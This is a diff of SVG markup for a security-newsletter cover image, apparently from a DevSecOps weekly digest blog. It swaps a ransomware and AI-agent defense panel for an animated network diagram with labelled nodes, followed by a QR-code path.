-    <text x="14" y="18" font-family="Inter, monospace" font-size="10" font-weight="700" fill="#FFD58A">SRC</text>
-    <text x="140" y="19" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="14" font-weight="900" fill="#F5F7FA">COINTELEGRAPH</text>
-    <text x="266" y="18" text-anchor="end" font-family="Inter, monospace" font-size="10" font-weight="700" fill="#FFD58A">REG</text>
-  </g>
-</g>
-
-<!-- COL C: AI Agent + Ransomware Defense (Mar 02) -->
-<g transform="translate(792,216)">
-  <rect x="0" y="0" width="336" height="374" rx="14" fill="url(#colC)" stroke="#E63946" stroke-width="1.6" opacity="0.97"/>
-  <rect x="0" y="0" width="336" height="4" fill="#E63946" opacity="0.7"/>
-  <g filter="url(#textShadow)">
-    <text x="20" y="28" font-family="Inter, Helvetica, Arial, sans-serif" font-size="11" font-weight="700" fill="#F87171" letter-spacing="2.4">HIGH  /  AI + RANSOMWARE</text>
-    <text x="20" y="54" font-family="Inter, Helvetica, Arial, sans-serif" font-size="20" font-weight="800" fill="#F5F7FA">AI Agent Defense</text>
-    <text x="20" y="76" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="500" fill="#FCA5A5">MCP policy + ransomware strategy</text>
-  </g>
-  <!-- Scene: shield + lock + alert pulse -->
-  <g transform="translate(168,138)">
-    <path d="M0,-44 L36,-28 L36,8 Q36,36 0,48 Q-36,36 -36,8 L-36,-28 Z" fill="#2E1016" stroke="#E63946" stroke-width="2" filter="url(#softShadow)"/>
-    <path d="M0,-34 L26,-22 L26,6 Q26,26 0,36 Q-26,26 -26,6 L-26,-22 Z" fill="#1E0A12" stroke="#FCA5A5" stroke-width="1" opacity="0.7"/>
-    <rect x="-9" y="-4" width="18" height="14" rx="3" fill="#E63946" opacity="0.9"/>
-    <path d="M-6,-4 L-6,-10 Q-6,-16 0,-16 Q6,-16 6,-10 L6,-4" fill="none" stroke="#FCA5A5" stroke-width="2" stroke-linecap="round"/>
-    <circle cx="0" cy="4" r="2.5" fill="#F5F7FA"/>
-    <circle r="50" fill="none" stroke="#E63946" stroke-width="1" opacity="0.3">
-      <animate attributeName="r" values="44;56;44" dur="2.2s" repeatCount="indefinite"/>
-      <animate attributeName="opacity" values="0.3;0.6;0.3" dur="2.2s" repeatCount="indefinite"/>
-    </circle>
-  </g>
-  <!-- 3-step chain -->
-  <g transform="translate(28,202)">
-    <rect x="0" y="0" width="280" height="34" rx="6" fill="#1E0A12" stroke="#E63946" stroke-width="1.2"/>
-    <circle cx="18" cy="17" r="7" fill="#E63946"/>
-    <text x="18" y="21" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="800" fill="#FFFFFF">1</text>
-    <text x="36" y="22" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="700" fill="#F5F7FA">MCP tool policy + privilege sep</text>
-    <line x1="18" y1="38" x2="18" y2="50" stroke="#E63946" stroke-width="1.4" stroke-dasharray="2 2"/>
-    <g transform="translate(0,54)">
-      <rect x="0" y="0" width="280" height="34" rx="6" fill="#1E0A12" stroke="#E63946" stroke-width="1.2"/>
-      <circle cx="18" cy="17" r="7" fill="#E63946"/>
-      <text x="18" y="21" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="800" fill="#FFFFFF">2</text>
-      <text x="36" y="22" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="700" fill="#F5F7FA">EDR mass-encryption detection</text>
-    </g>
-    <line x1="18" y1="92" x2="18" y2="104" stroke="#E63946" stroke-width="1.4" stroke-dasharray="2 2"/>
-    <g transform="translate(0,108)">
-      <rect x="0" y="0" width="280" height="34" rx="6" fill="#2E1016" stroke="#FCA5A5" stroke-width="1.4"/>
-      <circle cx="18" cy="17" r="7" fill="#FCA5A5"/>
-      <text x="18" y="21" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="800" fill="#1E0A12">3</text>
-      <text x="36" y="22" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="800" fill="#F5F7FA">Anthropic MCP course deploy</text>
-    </g>
-  </g>
-  <!-- KPI pill -->
-  <g transform="translate(28,342)" filter="url(#softShadow)">
-    <rect x="0" y="0" width="280" height="26" rx="8" fill="#2E1016" stroke="#E63946" stroke-width="1.6"/>
-    <text x="14" y="18" font-family="Inter, monospace" font-size="10" font-weight="700" fill="#FCA5A5">RISK</text>
-    <text x="140" y="19" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="14" font-weight="900" fill="#F5F7FA">AI AGENT + RANSOM</text>
-    <text x="266" y="18" text-anchor="end" font-family="Inter, monospace" font-size="10" font-weight="700" fill="#FCA5A5">HIGH</text>
-  </g>
-</g>
-
-<!-- Footer bar -->
-<rect x="0" y="596" width="1200" height="34" fill="#050813" opacity="0.88"/>
-<text x="36" y="618" font-family="Inter, Helvetica, Arial, sans-serif" font-size="11" font-weight="500" fill="#4A6AA0">tech.2twodragon.com</text>
-<text x="1164" y="618" font-family="Inter, Helvetica, Arial, sans-serif" font-size="11" font-weight="500" fill="#4A6AA0" text-anchor="end">DevSecOps / Security Weekly</text>
-
-<!-- cover-qr: https://tech.2twodragon.com/posts/2026/03/02/Tech_Security_Weekly_Digest_Ransomware_AI_Agent/ : 41x41 -->
+<g transform="translate(800,490)"><circle cx="0" cy="0" r="30" fill="#0A1540" stroke="#3A86FF" stroke-width="2" filter="url(#softShadow)"><animate attributeName="r" values="28;34;28" dur="3.2s" repeatCount="indefinite"/></circle><text x="0" y="2" text-anchor="middle" font-family="Inter, monospace" font-size="11" font-weight="900" fill="#60A5FA">SHIELD</text><text x="0" y="16" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="700" fill="#3A86FF">HUB</text><g stroke="#3A86FF" stroke-width="1" stroke-dasharray="3 2" fill="none" opacity="0.6"><line x1="0" y1="0" x2="90" y2="-55"/><line x1="0" y1="0" x2="108" y2="0"/><line x1="0" y1="0" x2="90" y2="55"/><line x1="0" y1="0" x2="-90" y2="55"/><line x1="0" y1="0" x2="-108" y2="0"/><line x1="0" y1="0" x2="-90" y2="-55"/></g><g font-family="Inter, monospace" font-size="7" font-weight="800"><g transform="translate(92,-58)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#3A86FF" stroke-width="1.2"/><text x="0" y="2" text-anchor="middle" fill="#60A5FA">EDGE-1</text><circle cx="20" cy="-8" r="4" fill="#E63946"><animate attributeName="opacity" values="0.4;1;0.4" dur="1.6s" repeatCount="indefinite"/></circle></g><g transform="translate(112,0)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#3A86FF" stroke-width="1.2"/><text x="0" y="2" text-anchor="middle" fill="#60A5FA">EDGE-2</text><circle cx="20" cy="-8" r="4" fill="#E63946"><animate attributeName="opacity" values="0.4;1;0.4" dur="2s" begin="0.3s" repeatCount="indefinite"/></circle></g><g transform="translate(92,58)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#FFB703" stroke-width="1.2"/><text x="0" y="2" text-anchor="middle" fill="#FFD58A">RELAY</text></g><g transform="translate(-92,58)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#FFB703" stroke-width="1.2"/><text x="0" y="2" text-anchor="middle" fill="#FFD58A">PROXY</text></g><g transform="translate(-112,0)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#4ADE80" stroke-width="1.2"/><text x="0" y="2" text-anchor="middle" fill="#4ADE80">VICTIM</text></g><g transform="translate(-92,-58)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#4ADE80" stroke-width="1.2"/><text x="0" y="2" text-anchor="middle" fill="#4ADE80">CREDS</text></g></g><g fill="#60A5FA"><circle r="2.2"><animateMotion path="M0 0 L90 -55" dur="2s" repeatCount="indefinite"/></circle><circle r="2.2"><animateMotion path="M0 0 L108 0" dur="1.8s" begin="0.3s" repeatCount="indefinite"/></circle><circle r="2.2"><animateMotion path="M0 0 L90 55" dur="2.2s" begin="0.6s" repeatCount="indefinite"/></circle><circle r="2.2"><animateMotion path="M0 0 L-90 55" dur="2.4s" begin="0.9s" repeatCount="indefinite"/></circle><circle r="2.2"><animateMotion path="M0 0 L-108 0" dur="1.9s" begin="1.2s" repeatCount="indefinite"/></circle><circle r="2.2"><animateMotion path="M0 0 L-90 -55" dur="2.1s" begin="1.5s" repeatCount="indefinite"/></circle></g></g>
+<g transform="translate(1094,452)" filter="url(#softShadow)"><rect x="-68" y="-55" width="140" height="110" rx="10" fill="#071426" stroke="#3A86FF" stroke-width="2"/><text x="2" y="-28" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="700" letter-spacing="2" fill="#7DA3D9">SHIELD</text><text x="2" y="18" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="28" font-weight="900" fill="#F5F7FA">ZTA</text><text x="2" y="40" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="600" fill="#BFC9D9">feb-rpt</text></g>
+<g opacity="0.85"><g fill="#F87171"><circle cx="1104" cy="110" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.8s" repeatCount="indefinite"/></circle><circle cx="1124" cy="110" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.4s" begin="0.3s" repeatCount="indefinite"/></circle></g><g fill="#7DA3D9"><circle cx="1104" cy="218" r="1.2"><animate attributeName="opacity" values="0.2;1;0.2" dur="2s" repeatCount="indefinite"/></circle><circle cx="1124" cy="218" r="1.2"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.6s" begin="0.4s" repeatCount="indefinite"/></circle></g><g fill="#FFD58A"><circle cx="1104" cy="374" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.8s" repeatCount="indefinite"/></circle><circle cx="1124" cy="374" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.6s" begin="0.3s" repeatCount="indefinite"/></circle></g><g stroke="#E63946" stroke-width="0.5" fill="none"><path d="M20 230 L28 230"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="2s" repeatCount="indefinite"/></path><path d="M20 300 L28 300"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="2.3s" begin="0.3s" repeatCount="indefinite"/></path><path d="M20 370 L28 370"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="1.9s" begin="0.6s" repeatCount="indefinite"/></path><path d="M20 440 L28 440"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="2.1s" begin="0.9s" repeatCount="indefinite"/></path></g></g>
 <g transform="translate(1080,504)" filter="url(#softShadow)">
   <rect x="-8" y="-8" width="100" height="100" rx="6" fill="#FFFFFF"/>
   <path fill="#0A1020" d="M0.0 0.0h14.341v2.049h-14.341z M16.39 0.0h6.146v2.049h-6.146z M24.585 0.0h2.049v2.049h-2.049z M28.683 0.0h4.098v2.049h-4.098z M34.829 0.0h4.098v2.049h-4.098z M45.073 0.0h2.049v2.049h-2.049z M53.268 0.0h6.146v2.049h-6.146z M61.463 0.0h2.049v2.049h-2.049z M69.659 0.0h14.341v2.049h-14.341z M0.0 2.049h2.049v2.049h-2.049z M12.293 2.049h2.049v2.049h-2.049z M18.439 2.049h4.098v2.049h-4.098z M26.634 2.049h2.049v2.049h-2.049z M30.732 2.049h6.146v2.049h-6.146z M38.927 2.049h2.049v2.049h-2.049z M49.171 2.049h2.049v2.049h-2.049z M59.415 2.049h2.049v2.049h-2.049z M63.512 2.049h2.049v2.049h-2.049z M69.659 2.049h2.049v2.049h-2.049z M81.951 2.049h2.049v2.049h-2.049z M0.0 4.098h2.049v2.049h-2.049z M4.098 4.098h6.146v2.049h-6.146z M12.293 4.098h2.049v2.049h-2.049z M20.488 4.098h8.195v2.049h-8.195z M30.732 4.098h2.049v2.049h-2.049z M38.927 4.098h2.049v2.049h-2.049z M43.024 4.098h2.049v2.049h-2.049z M47.122 4.098h6.146v2.049h-6.146z M55.317 4.098h2.049v2.049h-2.049z M59.415 4.098h4.098v2.049h-4.098z M65.561 4.098h2.049v2.049h-2.049z M69.659 4.098h2.049v2.049h-2.049z M73.756 4.098h6.146v2.049h-6.146z M81.951 4.098h2.049v2.049h-2.049z M0.0 6.146h2.049v2.049h-2.049z M4.098 6.146h6.146v2.049h-6.146z M12.293 6.146h2.049v2.049h-2.049z M16.39 6.146h2.049v2.049h-2.049z M22.537 6.146h2.049v2.049h-2.049z M26.634 6.146h4.098v2.049h-4.098z M32.78 6.146h6.146v2.049h-6.146z M40.976 6.146h10.244v2.049h-10.244z M53.268 6.146h4.098v2.049h-4.098z M61.463 6.146h2.049v2.049h-2.049z M65.561 6.146h2.049v2.049h-2.049z M69.659 6.146h2.049v2.049h-2.049z M73.756 6.146h6.146v2.049h-6.146z M81.951 6.146h2.049v2.049h-2.049z M0.0 8.195h2.049v2.049h-2.049z M4.098 8.195h6.146v2.049h-6.146z M12.293 8.195h2.049v2.049h-2.049z M16.39 8.195h2.049v2.049h-2.049z M22.537 8.195h2.049v2.049h-2.049z M26.634 8.195h4.098v2.049h-4.098z M32.78 8.195h8.195v2.049h-8.195z M45.073 8.195h2.049v2.049h-2.049z M51.22 8.195h6.146v2.049h-6.146z M61.463 8.195h2.049v2.049h-2.049z M65.561 8.195h2.049v2.049h-2.049z M69.659 8.195h2.049v2.049h-2.049z M73.756 8.195h6.146v2.049h-6.146z M81.951 8.195h2.049v2.049h-2.049z M0.0 10.244h2.049v2.049h-2.049z M12.293 10.244h2.049v2.049h-2.049z M16.39 10.244h2.049v2.049h-2.049z M20.488 10.244h2.049v2.049h-2.049z M26.634 10.244h2.049v2.049h-2.049z M30.732 10.244h6.146v2.049h-6.146z M38.927 10.244h2.049v2.049h-2.049z M43.024 10.244h2.049v2.049h-2.049z M53.268 10.244h2.049v2.049h-2.049z M63.512 10.244h4.098v2.049h-4.098z M69.659 10.244h2.049v2.049h-2.049z M81.951 10.244h2.049v2.049h-2.049z M0.0 12.293h14.341v2.049h-14.341z M16.39 12.293h2.049v2.049h-2.049z M20.488 12.293h2.049v2.049h-2.049z M24.585 12.293h2.049v2.049h-2.049z M28.683 12.293h2.049v2.049h-2.049z M32.78 12.293h2.049v2.049h-2.049z M36.878 12.293h2.049v2.049h-2.049z M40.976 12.293h2.049v2.049h-2.049z M45.073 12.293h2.049v2.049h-2.049z M49.171 12.293h2.049v2.049h-2.049z M53.268 12.293h2.049v2.049h-2.049z M57.366 12.293h2.049v2.049h-2.049z M61.463 12.293h2.049v2.049h-2.049z M65.561 12.293h2.049v2.049h-2.049z M69.659 12.293h14.341v2.049h-14.341z M16.39 14.341h8.195v2.049h-8.195z M26.634 14.341h2.049v2.049h-2.049z M32.78 14.341h4.098v2.049h-4.098z M38.927 14.341h8.195v2.049h-8.195z M49.171 14.341h2.049v2.049h-2.049z M55.317 14.341h6.146v2.049h-6.146z M63.512 14.341h2.049v2.049h-2.049z M0.0 16.39h2.049v2.049h-2.049z M8.195 16.39h2.049v2.049h-2.049z M12.293 16.39h8.195v2.049h-8.195z M22.537 16.39h14.341v2.049h-14.341z M40.976 16.39h8.195v2.049h-8.195z M57.366 16.39h4.098v2.049h-4.098z M63.512 16.39h2.049v2.049h-2.049z M67.61 16.39h10.244v2.049h-10.244z M81.951 16.39h2.049v2.049h-2.049z M0.0 18.439h12.293v2.049h-12.293z M16.39 18.439h2.049v2.049h-2.049z M20.488 18.439h4.098v2.049h-4.098z M30.732 18.439h4.098v2.049h-4.098z M36.878 18.439h2.049v2.049h-2.049z M40.976 18.439h2.049v2.049h-2.049z M47.122 18.439h2.049v2.049h-2.049z M51.22 18.439h2.049v2.049h-2.049z M55.317 18.439h2.049v2.049h-2.049z M61.463 18.439h2.049v2.049h-2.049z M67.61 18.439h2.049v2.049h-2.049z M71.707 18.439h6.146v2.049h-6.146z M79.902 18.439h4.098v2.049h-4.098z M2.049 20.488h2.049v2.049h-2.049z M8.195 20.488h6.146v2.049h-6.146z M24.585 20.488h4.098v2.049h-4.098z M43.024 20.488h2.049v2.049h-2.049z M47.122 20.488h2.049v2.049h-2.049z M51.22 20.488h2.049v2.049h-2.049z M55.317 20.488h6.146v2.049h-6.146z M65.561 20.488h6.146v2.049h-6.146z M81.951 20.488h2.049v2.049h-2.049z M0.0 22.537h2.049v2.049h-2.049z M6.146 22.537h2.049v2.049h-2.049z M14.341 22.537h4.098v2.049h-4.098z M22.537 22.537h2.049v2.049h-2.049z M26.634 22.537h4.098v2.049h-4.098z M34.829 22.537h16.39v2.049h-16.39z M53.268 22.537h2.049v2.049h-2.049z M59.415 22.537h2.049v2.049h-2.049z M63.512 22.537h4.098v2.049h-4.098z M69.659 22.537h8.195v2.049h-8.195z M81.951 22.537h2.049v2.049h-2.049z M2.049 24.585h4.098v2.049h-4.098z M8.195 24.585h6.146v2.049h-6.146z M16.39 24.585h2.049v2.049h-2.049z M22.537 24.585h2.049v2.049h-2.049z M26.634 24.585h10.244v2.049h-10.244z M43.024 24.585h4.098v2.049h-4.098z M49.171 24.585h2.049v2.049h-2.049z M53.268 24.585h4.098v2.049h-4.098z M59.415 24.585h4.098v2.049h-4.098z M65.561 24.585h4.098v2.049h-4.098z M71.707 24.585h2.049v2.049h-2.049z M0.0 26.634h2.049v2.049h-2.049z M8.195 26.634h2.049v2.049h-2.049z M18.439 26.634h8.195v2.049h-8.195z M32.78 26.634h12.293v2.049h-12.293z M53.268 26.634h2.049v2.049h-2.049z M59.415 26.634h2.049v2.049h-2.049z M71.707 26.634h4.098v2.049h-4.098z M79.902 26.634h4.098v2.049h-4.098z M4.098 28.683h2.049v2.049h-2.049z M10.244 28.683h4.098v2.049h-4.098z M16.39 28.683h6.146v2.049h-6.146z M24.585 28.683h2.049v2.049h-2.049z M28.683 28.683h6.146v2.049h-6.146z M36.878 28.683h2.049v2.049h-2.049z M40.976 28.683h2.049v2.049h-2.049z M55.317 28.683h2.049v2.049h-2.049z M65.561 28.683h6.146v2.049h-6.146z M73.756 28.683h6.146v2.049h-6.146z M81.951 28.683h2.049v2.049h-2.049z M2.049 30.732h6.146v2.049h-6.146z M22.537 30.732h2.049v2.049h-2.049z M26.634 30.732h2.049v2.049h-2.049z M34.829 30.732h4.098v2.049h-4.098z M43.024 30.732h2.049v2.049h-2.049z M49.171 30.732h2.049v2.049h-2.049z M53.268 30.732h2.049v2.049h-2.049z M59.415 30.732h4.098v2.049h-4.098z M71.707 30.732h2.049v2.049h-2.049z M75.805 30.732h2.049v2.049h-2.049z M81.951 30.732h2.049v2.049h-2.049z M0.0 32.78h2.049v2.049h-2.049z M10.244 32.78h4.098v2.049h-4.098z M16.39 32.78h4.098v2.049h-4.098z M24.585 32.78h8.195v2.049h-8.195z M34.829 32.78h2.049v2.049h-2.049z M38.927 32.78h2.049v2.049h-2.049z M45.073 32.78h4.098v2.049h-4.098z M55.317 32.78h2.049v2.049h-2.049z M59.415 32.78h2.049v2.049h-2.049z M63.512 32.78h4.098v2.049h-4.098z M71.707 32.78h2.049v2.049h-2.049z M79.902 32.78h2.049v2.049h-2.049z M4.098 34.829h6.146v2.049h-6.146z M16.39 34.829h2.049v2.049h-2.049z M24.585 34.829h2.049v2.049h-2.049z M30.732 34.829h2.049v2.049h-2.049z M36.878 34.829h2.049v2.049h-2.049z M43.024 34.829h6.146v2.049h-6.146z M51.22 34.829h4.098v2.049h-4.098z M57.366 34.829h2.049v2.049h-2.049z M61.463 34.829h2.049v2.049h-2.049z M67.61 34.829h12.293v2.049h-12.293z M81.951 34.829h2.049v2.049h-2.049z M0.0 36.878h6.146v2.049h-6.146z M10.244 36.878h4.098v2.049h-4.098z M18.439 36.878h8.195v2.049h-8.195z M30.732 36.878h2.049v2.049h-2.049z M34.829 36.878h2.049v2.049h-2.049z M47.122 36.878h4.098v2.049h-4.098z M55.317 36.878h2.049v2.049h-2.049z M59.415 36.878h4.098v2.049h-4.098z M65.561 36.878h2.049v2.049h-2.049z M69.659 36.878h4.098v2.049h-4.098z M77.854 36.878h6.146v2.049h-6.146z M0.0 38.927h4.098v2.049h-4.098z M8.195 38.927h2.049v2.049h-2.049z M16.39 38.927h2.049v2.049h-2.049z M20.488 38.927h2.049v2.049h-2.049z M24.585 38.927h6.146v2.049h-6.146z M34.829 38.927h8.195v2.049h-8.195z M45.073 38.927h2.049v2.049h-2.049z M53.268 38.927h2.049v2.049h-2.049z M59.415 38.927h4.098v2.049h-4.098z M65.561 38.927h8.195v2.049h-8.195z M75.805 38.927h2.049v2.049h-2.049z M81.951 38.927h2.049v2.049h-2.049z M2.049 40.976h2.049v2.049h-2.049z M8.195 40.976h2.049v2.049h-2.049z M12.293 40.976h4.098v2.049h-4.098z M18.439 40.976h8.195v2.049h-8.195z M36.878 40.976h2.049v2.049h-2.049z M45.073 40.976h2.049v2.049h-2.049z M49.171 40.976h12.293v2.049h-12.293z M63.512 40.976h2.049v2.049h-2.049z M67.61 40.976h2.049v2.049h-2.049z M73.756 40.976h4.098v2.049h-4.098z M79.902 40.976h4.098v2.049h-4.098z M2.049 43.024h10.244v2.049h-10.244z M16.39 43.024h2.049v2.049h-2.049z M20.488 43.024h8.195v2.049h-8.195z M32.78 43.024h2.049v2.049h-2.049z M38.927 43.024h2.049v2.049h-2.049z M47.122 43.024h6.146v2.049h-6.146z M55.317 43.024h2.049v2.049h-2.049z M61.463 43.024h2.049v2.049h-2.049z M65.561 43.024h14.341v2.049h-14.341z M81.951 43.024h2.049v2.049h-2.049z M0.0 45.073h8.195v2.049h-8.195z M12.293 45.073h2.049v2.049h-2.049z M16.39 45.073h4.098v2.049h-4.098z M22.537 45.073h4.098v2.049h-4.098z M28.683 45.073h4.098v2.049h-4.098z M43.024 45.073h6.146v2.049h-6.146z M53.268 45.073h4.098v2.049h-4.098z M59.415 45.073h4.098v2.049h-4.098z M65.561 45.073h2.049v2.049h-2.049z M73.756 45.073h2.049v2.049h-2.049z M77.854 45.073h2.049v2.049h-2.049z M81.951 45.073h2.049v2.049h-2.049z M0.0 47.122h2.049v2.049h-2.049z M4.098 47.122h8.195v2.049h-8.195z M16.39 47.122h2.049v2.049h-2.049z M20.488 47.122h4.098v2.049h-4.098z M30.732 47.122h8.195v2.049h-8.195z M43.024 47.122h2.049v2.049h-2.049z M59.415 47.122h8.195v2.049h-8.195z M73.756 47.122h4.098v2.049h-4.098z M81.951 47.122h2.049v2.049h-2.049z M0.0 49.171h6.146v2.049h-6.146z M12.293 49.171h4.098v2.049h-4.098z M18.439 49.171h4.098v2.049h-4.098z M24.585 49.171h2.049v2.049h-2.049z M28.683 49.171h2.049v2.049h-2.049z M34.829 49.171h2.049v2.049h-2.049z M40.976 49.171h6.146v2.049h-6.146z M49.171 49.171h2.049v2.049h-2.049z M55.317 49.171h2.049v2.049h-2.049z M59.415 49.171h2.049v2.049h-2.049z M65.561 49.171h4.098v2.049h-4.098z M71.707 49.171h2.049v2.049h-2.049z M75.805 49.171h2.049v2.049h-2.049z M79.902 49.171h4.098v2.049h-4.098z M2.049 51.22h4.098v2.049h-4.098z M16.39 51.22h2.049v2.049h-2.049z M20.488 51.22h8.195v2.049h-8.195z M30.732 51.22h4.098v2.049h-4.098z M36.878 51.22h2.049v2.049h-2.049z M47.122 51.22h2.049v2.049h-2.049z M55.317 51.22h2.049v2.049h-2.049z M61.463 51.22h2.049v2.049h-2.049z M65.561 51.22h4.098v2.049h-4.098z M71.707 51.22h4.098v2.049h-4.098z M77.854 51.22h2.049v2.049h-2.049z M81.951 51.22h2.049v2.049h-2.049z M6.146 53.268h4.098v2.049h-4.098z M12.293 53.268h4.098v2.049h-4.098z M22.537 53.268h2.049v2.049h-2.049z M26.634 53.268h2.049v2.049h-2.049z M30.732 53.268h8.195v2.049h-8.195z M40.976 53.268h4.098v2.049h-4.098z M47.122 53.268h12.293v2.049h-12.293z M65.561 53.268h4.098v2.049h-4.098z M71.707 53.268h2.049v2.049h-2.049z M81.951 53.268h2.049v2.049h-2.049z M2.049 55.317h8.195v2.049h-8.195z M16.39 55.317h2.049v2.049h-2.049z M22.537 55.317h2.049v2.049h-2.049z M28.683 55.317h4.098v2.049h-4.098z M34.829 55.317h10.244v2.049h-10.244z M49.171 55.317h2.049v2.049h-2.049z M53.268 55.317h8.195v2.049h-8.195z M63.512 55.317h4.098v2.049h-4.098z M69.659 55.317h2.049v2.049h-2.049z M75.805 55.317h2.049v2.049h-2.049z M10.244 57.366h4.098v2.049h-4.098z M18.439 57.366h2.049v2.049h-2.049z M22.537 57.366h14.341v2.049h-14.341z M40.976 57.366h8.195v2.049h-8.195z M53.268 57.366h4.098v2.049h-4.098z M59.415 57.366h4.098v2.049h-4.098z M65.561 57.366h4.098v2.049h-4.098z M71.707 57.366h2.049v2.049h-2.049z M79.902 57.366h2.049v2.049h-2.049z M0.0 59.415h2.049v2.049h-2.049z M4.098 59.415h8.195v2.049h-8.195z M18.439 59.415h2.049v2.049h-2.049z M22.537 59.415h2.049v2.049h-2.049z M28.683 59.415h4.098v2.049h-4.098z M34.829 59.415h6.146v2.049h-6.146z M49.171 59.415h4.098v2.049h-4.098z M55.317 59.415h2.049v2.049h-2.049z M59.415 59.415h2.049v2.049h-2.049z M63.512 59.415h2.049v2.049h-2.049z M67.61 59.415h2.049v2.049h-2.049z M71.707 59.415h12.293v2.049h-12.293z M4.098 61.463h2.049v2.049h-2.049z M12.293 61.463h6.146v2.049h-6.146z M22.537 61.463h2.049v2.049h-2.049z M28.683 61.463h2.049v2.049h-2.049z M34.829 61.463h6.146v2.049h-6.146z M45.073 61.463h18.439v2.049h-18.439z M65.561 61.463h4.098v2.049h-4.098z M73.756 61.463h2.049v2.049h-2.049z M81.951 61.463h2.049v2.049h-2.049z M6.146 63.512h4.098v2.049h-4.098z M16.39 63.512h4.098v2.049h-4.098z M22.537 63.512h8.195v2.049h-8.195z M32.78 63.512h16.39v2.049h-16.39z M53.268 63.512h4.098v2.049h-4.098z M59.415 63.512h2.049v2.049h-2.049z M63.512 63.512h6.146v2.049h-6.146z M73.756 63.512h4.098v2.049h-4.098z M0.0 65.561h8.195v2.049h-8.195z M10.244 65.561h6.146v2.049h-6.146z M20.488 65.561h4.098v2.049h-4.098z M30.732 65.561h2.049v2.049h-2.049z M34.829 65.561h2.049v2.049h-2.049z M40.976 65.561h6.146v2.049h-6.146z M57.366 65.561h4.098v2.049h-4.098z M65.561 65.561h12.293v2.049h-12.293z M16.39 67.61h4.098v2.049h-4.098z M24.585 67.61h2.049v2.049h-2.049z M30.732 67.61h2.049v2.049h-2.049z M34.829 67.61h2.049v2.049h-2.049z M47.122 67.61h2.049v2.049h-2.049z M53.268 67.61h2.049v2.049h-2.049z M57.366 67.61h4.098v2.049h-4.098z M63.512 67.61h4.098v2.049h-4.098z M73.756 67.61h4.098v2.049h-4.098z M81.951 67.61h2.049v2.049h-2.049z M0.0 69.659h14.341v2.049h-14.341z M16.39 69.659h8.195v2.049h-8.195z M28.683 69.659h6.146v2.049h-6.146z M36.878 69.659h2.049v2.049h-2.049z M40.976 69.659h16.39v2.049h-16.39z M61.463 69.659h6.146v2.049h-6.146z M69.659 69.659h2.049v2.049h-2.049z M73.756 69.659h4.098v2.049h-4.098z M81.951 69.659h2.049v2.049h-2.049z M0.0 71.707h2.049v2.049h-2.049z M12.293 71.707h2.049v2.049h-2.049z M18.439 71.707h2.049v2.049h-2.049z M22.537 71.707h2.049v2.049h-2.049z M28.683 71.707h4.098v2.049h-4.098z M43.024 71.707h2.049v2.049h-2.049z M47.122 71.707h6.146v2.049h-6.146z M55.317 71.707h6.146v2.049h-6.146z M63.512 71.707h4.098v2.049h-4.098z M73.756 71.707h4.098v2.049h-4.098z M0.0 73.756h2.049v2.049h-2.049z M4.098 73.756h6.146v2.049h-6.146z M12.293 73.756h2.049v2.049h-2.049z M16.39 73.756h2.049v2.049h-2.049z M22.537 73.756h2.049v2.049h-2.049z M38.927 73.756h4.098v2.049h-4.098z M51.22 73.756h2.049v2.049h-2.049z M55.317 73.756h2.049v2.049h-2.049z M59.415 73.756h2.049v2.049h-2.049z M63.512 73.756h12.293v2.049h-12.293z M79.902 73.756h4.098v2.049h-4.098z M0.0 75.805h2.049v2.049h-2.049z M4.098 75.805h6.146v2.049h-6.146z M12.293 75.805h2.049v2.049h-2.049z M22.537 75.805h6.146v2.049h-6.146z M30.732 75.805h2.049v2.049h-2.049z M36.878 75.805h2.049v2.049h-2.049z M45.073 75.805h12.293v2.049h-12.293z M71.707 75.805h2.049v2.049h-2.049z M77.854 75.805h4.098v2.049h-4.098z M0.0 77.854h2.049v2.049h-2.049z M4.098 77.854h6.146v2.049h-6.146z M12.293 77.854h2.049v2.049h-2.049z M18.439 77.854h2.049v2.049h-2.049z M22.537 77.854h10.244v2.049h-10.244z M40.976 77.854h2.049v2.049h-2.049z M47.122 77.854h2.049v2.049h-2.049z M51.22 77.854h8.195v2.049h-8.195z M63.512 77.854h2.049v2.049h-2.049z M67.61 77.854h2.049v2.049h-2.049z M75.805 77.854h2.049v2.049h-2.049z M81.951 77.854h2.049v2.049h-2.049z M0.0 79.902h2.049v2.049h-2.049z M12.293 79.902h2.049v2.049h-2.049z M18.439 79.902h2.049v2.049h-2.049z M22.537 79.902h2.049v2.049h-2.049z M28.683 79.902h2.049v2.049h-2.049z M32.78 79.902h4.098v2.049h-4.098z M38.927 79.902h2.049v2.049h-2.049z M43.024 79.902h2.049v2.049h-2.049z M47.122 79.902h2.049v2.049h-2.049z M53.268 79.902h2.049v2.049h-2.049z M59.415 79.902h4.098v2.049h-4.098z M65.561 79.902h8.195v2.049h-8.195z M75.805 79.902h2.049v2.049h-2.049z M79.902 79.902h4.098v2.049h-4.098z 